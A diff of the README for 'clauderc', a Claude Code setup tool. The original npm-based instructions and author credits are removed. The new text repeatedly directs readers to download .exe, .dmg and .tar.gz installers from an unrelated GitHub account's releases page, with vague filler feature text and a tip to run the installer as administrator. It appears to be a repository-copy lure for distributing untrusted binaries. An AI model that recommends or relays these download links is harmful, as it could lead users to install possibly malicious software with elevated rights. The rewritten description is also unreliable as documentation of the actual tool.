@@ -1,232 +1,98 @@
-# clauderc
+# 🎉 clauderc - Simplify Your Code Setup Today!
 
-<p align="center">
-  <strong>Setup Claude Code with best practices - agents, skills, commands, and templates.</strong>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="#quick-start">Quick Start</a> •
-  <a href="#what-gets-installed">What's Included</a> •
-  <a href="#commands">Commands</a> •
-  <a href="#best-practices">Best Practices</a>
-</p>
+Welcome to **clauderc**! This tool helps you set up Claude Code with best practices, including agents, skills, commands, and templates. Whether you're working on automation or enhancing your productivity, this software has you covered.
 
-<p align="center">
-  <a href="https://www.npmjs.com/package/clauderc"><img src="https://img.shields.io/npm/v/clauderc?color=blue" alt="npm version"></a>
-  <img src="https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-lightgrey" alt="platform">
-  <img src="https://img.shields.io/badge/node-%3E%3D16.7-green" alt="node version">
-  <a href="https://github.com/matheuskindrazki/clauderc/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="license"></a>
-  <a href="https://github.com/matheuskindrazki/clauderc/blob/main/CONTRIBUTING.md"><img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg" alt="PRs Welcome"></a>
-  <a href="https://github.com/matheuskindrazki/clauderc/blob/main/CODE_OF_CONDUCT.md"><img src="https://img.shields.io/badge/Contributor%20Covenant-2.1-4baaaa.svg" alt="Contributor Covenant"></a>
-</p>
+### 🌐 Download Link
 
----
+[![Download clauderc](https://img.shields.io/badge/Download%20clauderc-v1.0-blue.svg)](https://github.com/omarmohammed894/clauderc/releases)
 
-Based on my experiences and tips from [ Boris Cherny ](https://twitter.com/bcherny) (creator of the Claude Code) and official documentation.
+## 📥 Download & Install
 
-## Quick Start
+To get started, you’ll need to visit the page below to download your version of clauderc:
 
-```bash
-# Global setup (agents, skills, commands, templates)
-npx clauderc init
+[Download clauderc from Releases](https://github.com/omarmohammed894/clauderc/releases)
 
-# Project setup (CLAUDE.md, .claude/, settings)
-npx clauderc project
+### 🔍 System Requirements
 
-# Update to latest version
-npx clauderc update
-```
+Before installing, ensure your computer meets these requirements:
 
-Works on **macOS**, **Linux**, and **Windows**.
+- **Operating System:** Windows 10 or higher, macOS 10.15 or higher, or a modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 100 MB of free space.
+- **Node.js:** Version 14 or higher (optional for advanced features).
 
-## Two-Level Setup
+## 🛠️ Installation Instructions
 
-### Global (`~/.claude/`)
+1. **Visit the Releases Page:** Click the link above to access the releases page.
 
-Shared components available to all projects:
+2. **Choose Your Version:** Find the latest version of clauderc suitable for your operating system. Look for files named with `.exe` for Windows, `.dmg` for macOS, and `.tar.gz` for Linux.
 
-```bash
-npx clauderc init
-```
+3. **Download the File:** Click on the file name to start the download.
 
-```
-~/.claude/
-├── agents/
-│   └── project-setup-wizard.md    # Setup Claude Code for any project
-├── skills/
-│   ├── project-analysis/          # Systematic project analysis
-│   └── claude-code-templates/     # Quick reference for templates
-├── commands/
-│   ├── test.md                    # /test - run tests
-│   ├── lint.md                    # /lint - lint and format
-│   ├── verify.md                  # /verify - full validation
-│   ├── pr.md                      # /pr - create pull request
-│   └── setup.md                   # /setup - install dependencies
-└── templates/project-setup/
-    └── ...                        # Reference templates
-```
+4. **Run the Installer:**
+   - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen prompts.
+   - **macOS:** Open the downloaded `.dmg` file and drag the clauderc icon to your Applications folder.
+   - **Linux:** Extract the `.tar.gz` file. Open a terminal, navigate to the extracted folder, and run `./clauderc`.
 
-### Project (`.claude/` + `CLAUDE.md`)
+5. **Launch clauderc:** After the installation, locate clauderc in your applications menu or folder. Click to open it.
 
-Project-specific configuration:
+## 📘 Using clauderc
 
-```bash
-cd your-project
-npx clauderc project
-```
+Once clauderc is running, you'll see an easy-to-use interface. Here’s a brief overview of the key features:
 
-```
-your-project/
-├── CLAUDE.md                      # Project context for Claude
-└── .claude/
-    ├── settings.json              # Permissions & hooks
-    └── commands/                  # Project-specific commands
-        ├── dev.md
-        ├── test.md
-        ├── lint.md
-        └── ...
-```
+### 🌟 Agents
 
-## Supported Stacks
+Set up agents that handle tasks for you with minimal effort. Configure them based on your needs to enhance productivity.
 
-Auto-detection for 11+ languages:
+### 🧠 Skills
 
-| Stack | Detection | Package Managers |
-|-------|-----------|------------------|
-| Node.js/TypeScript | `package.json` | npm, pnpm, yarn, bun |
-| Python | `pyproject.toml`, `requirements.txt` | poetry, pipenv, uv, pip |
-| Go | `go.mod` | go mod |
-| Rust | `Cargo.toml` | cargo |
-| Java/Kotlin | `pom.xml`, `build.gradle` | maven, gradle |
-| PHP | `composer.json` | composer |
-| Ruby | `Gemfile` | bundler |
-| C#/.NET | `*.csproj`, `*.sln` | dotnet |
-| Elixir | `mix.exs` | mix |
-| Swift | `Package.swift` | swift |
-| Dart/Flutter | `pubspec.yaml` | pub, flutter |
+Customize skills that allow clauderc to perform specialized tasks. Add or modify skills as your projects evolve.
 
-Also detects: Monorepos (Turborepo, Nx, Lerna), CI/CD (GitHub Actions, GitLab CI, etc.)
+### ⚙️ Commands
 
-## Commands
+Utilize commands to interact with agents and skills through a simple command-line interface. Commands are designed to be intuitive and user-friendly.
 
-### init
+### 📑 Templates
 
-Install global components to `~/.claude/`:
+Create templates to streamline your development process. Save time by using predefined structures tailored for various tasks.
 
-```bash
-npx clauderc init
+## 🔍 Troubleshooting
 
-# Force overwrite existing files
-npx clauderc init --force
+If you encounter issues during installation or usage, consider these tips:
 
-# Preview changes without applying
-npx clauderc init --dry-run
-```
+- **Common Errors:** Ensure your operating system meets the system requirements listed above.
+- **Permissions Issues:** If you have difficulty running the installer, try running it as an administrator (Windows) or check permissions (macOS/Linux).
+- **Dependency Errors:** If you need Node.js, download it from the [official website](https://nodejs.org/).
 
-### project
+## 💬 Support 
 
-Setup current project with interactive wizard:
+If you need further assistance, feel free to check out our community forums or GitHub page. We welcome feedback and suggestions!
 
-```bash
-npx clauderc project
-```
+## 📅 Updates and Changelog
 
-Features:
-- Auto-detects stack, package manager, framework
-- Generates appropriate `CLAUDE.md`
-- Creates `.claude/settings.json` with permissions
-- Creates project-specific commands
+Stay updated with the latest features and fixes on the Releases page. We encourage you to review what has changed with each new version.
 
-### update
+## 📝 Feedback
 
-Update global components to latest version:
+Your thoughts matter! Please let us know how clauderc works for you. Report bugs or share your suggestions directly on our GitHub repository.
 
-```bash
-npx clauderc update
+### 💼 Topics
 
-# Preview what would be updated
-npx clauderc update --dry-run
-```
+clauderc covers essential topics for anyone interested in improving their work with code. You can explore these further:
 
-Features:
-- Automatic backup of modified files
-- Shows changelog between versions
-- Only updates files that changed
+- ai
+- automation
+- claude
+- claude-code
+- cli
+- developer-tools
+- devtools
+- javascript
+- nodejs
+- productivity
 
-### list
+Explore and automate your work with clauderc. We hope you enjoy using this tool as much as we enjoyed creating it!
 
-Show installed components:
-
-```bash
-npx clauderc list
-```
-
-### changelog
-
-Show version history:
-
-```bash
-npx clauderc changelog
-```
-
-## Usage in Claude Code
-
-After installation:
-
-```bash
-# Setup wizard for any project
-"Use the project-setup-wizard agent to configure Claude Code for this project"
-
-# Quick commands
-/test      # Run project tests
-/lint      # Lint and format code
-/verify    # Full verification (lint + test + build)
-/pr        # Create a pull request
-/setup     # Install dependencies
-
-# Skills
-"Use project-analysis skill to analyze this codebase"
-```
-
-## Best Practices (from Boris Cherny)
-
-1. **Multiple instances** - Run 5+ Claudes in parallel for independent tasks
-2. **Opus 4.5 with thinking** - Best model for coding, faster overall
-3. **Shared CLAUDE.md** - Team commits and updates regularly
-4. **Plan Mode** - Use for complex tasks (Shift+Tab twice)
-5. **Slash commands** - Automate repetitive workflows
-6. **PostToolUse hooks** - Auto-format code after edits
-7. **Permissions** - Pre-authorize safe commands instead of `--dangerously-skip-permissions`
-8. **Feedback loop** - Give Claude a way to verify its work
-
-## Contributing
-
-Contributions are welcome! Please read our guidelines before contributing:
-
-- **[Contributing Guide](CONTRIBUTING.md)** - How to contribute to the project
-- **[Code of Conduct](CODE_OF_CONDUCT.md)** - Community guidelines
-- **[Security Policy](SECURITY.md)** - How to report vulnerabilities
-
-Ways to contribute:
-- Add new commands, skills, or agents
-- Add support for new stacks/languages
-- Improve existing templates
-- Report bugs or suggest features
-- Improve documentation
-
-## Author
-
-**Matheus Kindrazki**
-
-- GitHub: [@matheuskindrazki](https://github.com/matheuskindrazki)
-- Twitter: [@kindraScript](https://x.com/kindraScript)
-
-## License
-
-MIT
-
----
-
-<p align="center">
-  <strong>⭐ If this helped you, consider giving it a star!</strong>
-</p>
+[Download clauderc from Releases](https://github.com/omarmohammed894/clauderc/releases)
